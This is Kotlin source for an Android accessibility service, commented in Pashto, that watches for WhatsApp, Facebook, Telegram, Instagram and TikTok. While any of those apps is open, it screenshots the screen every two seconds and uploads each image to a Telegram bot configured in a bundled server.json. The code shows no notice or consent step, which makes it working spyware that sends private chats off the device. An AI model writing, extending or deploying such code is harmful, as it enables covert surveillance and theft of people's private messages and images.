package com.example.appmonitor

import android.accessibilityservice.AccessibilityService
import android.graphics.Bitmap
import android.os.Handler
import android.os.Looper
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class MonitorAccessibilityService : AccessibilityService() {
    private val handler = Handler(Looper.getMainLooper())
    private var isLoopActive = false

    // د ټولو څارل شویو اپلیکیشنونو لېست
    private val monitoredPackages = listOf(
        "com.whatsapp",             // WhatsApp
        "com.facebook.katana",      // Facebook
        "org.telegram.messenger",   // Telegram
        "com.instagram.android",    // Instagram
        "com.zhiliaoapp.musically"  // TikTok
    )

    private val screenshotRunnable = object : Runnable {
        override fun run() {
            val activeRootNode = rootInActiveWindow
            val activePackage = activeRootNode?.packageName?.toString()

            if (activePackage != null && monitoredPackages.contains(activePackage)) {
                captureAndSendScreenshot(activePackage)
                handler.postDelayed(this, 2000) // هر ۲ ثانیې وروسته عکس اخلي
            } else {
                isLoopActive = false
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return

        // که کوم څارل شوی اپ پرانیستل شو
        if (monitoredPackages.contains(packageName)) {
            if (!isLoopActive) {
                isLoopActive = true
                handler.removeCallbacks(screenshotRunnable)
                handler.post(screenshotRunnable)
            }
        } else {
            if (packageName != this.packageName) {
                isLoopActive = false
                handler.removeCallbacks(screenshotRunnable)
            }
        }
    }

    private fun captureAndSendScreenshot(currentPackage: String) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, Executors.newSingleThreadExecutor(), object : TakeScreenshotCallback {
                override fun onSuccess(screenshot: ScreenshotResult) {
                    val activeRootNode = rootInActiveWindow
                    val activePackage = activeRootNode?.packageName?.toString()
                    
                    if (activePackage == null || !monitoredPackages.contains(activePackage)) return

                    val hardwareBuffer = screenshot.hardwareBuffer
                    val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshot.colorSpace)
                    hardwareBuffer.close()

                    if (bitmap != null) {
                        val mutableBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, true)
                        val stream = ByteArrayOutputStream()
                        mutableBitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
                        sendTelegramPhoto(stream.toByteArray(), activePackage)
                    }
                }

                override fun onFailure(errorCode: Int) {}
            })
        }
    }

    private fun sendTelegramPhoto(photoBytes: ByteArray, appPackage: String) {
        try {
            val inputStream: InputStream = assets.open("server.json")
            val jsonString = inputStream.bufferedReader().use { it.readText() }
            val jsonObject = JSONObject(jsonString)
            val botToken = jsonObject.getString("bot_token")
            val chatId = jsonObject.getString("chat_id")

            // د فایل نوم د وخت (Timestamp) سره جوړوو تر څو هېڅکله تکرار نشي او تلګرام یې ونه ردوي
            val timeStamp = System.currentTimeMillis()
            val prefix = when (appPackage) {
                "com.whatsapp" -> "whatsapp"
                "com.facebook.katana" -> "facebook"
                "org.telegram.messenger" -> "telegram"
                "com.instagram.android" -> "instagram"
                "com.zhiliaoapp.musically" -> "tiktok"
                else -> "monitor"
            }
            val fileName = "${prefix}_${timeStamp}.jpg"

            Thread {
                try {
                    val boundary = "Boundary_" + System.currentTimeMillis()
                    val urlString = "https://api.telegram.org/bot$botToken/sendPhoto"
                    val url = URL(urlString)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.doOutput = true
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

                    val outputStream = conn.outputStream
                    val writer = OutputStreamWriter(outputStream, "UTF-8")

                    writer.append("--$boundary\r\n")
                    writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                    writer.append("$chatId\r\n")
                    writer.flush()

                    writer.append("--$boundary\r\n")
                    writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"$fileName\"\r\n")
                    writer.append("Content-Type: image/jpeg\r\n\r\n")
                    writer.flush()

                    outputStream.write(photoBytes)
                    outputStream.flush()

                    writer.append("\r\n--$boundary--\r\n")
                    writer.flush()
                    writer.close()

                    conn.responseCode
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }.start()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        isLoopActive = false
        handler.removeCallbacks(screenshotRunnable)
        return super.onUnbind(intent)
    }

    override fun onInterrupt() {
        isLoopActive = false
        handler.removeCallbacks(screenshotRunnable)
    }
}
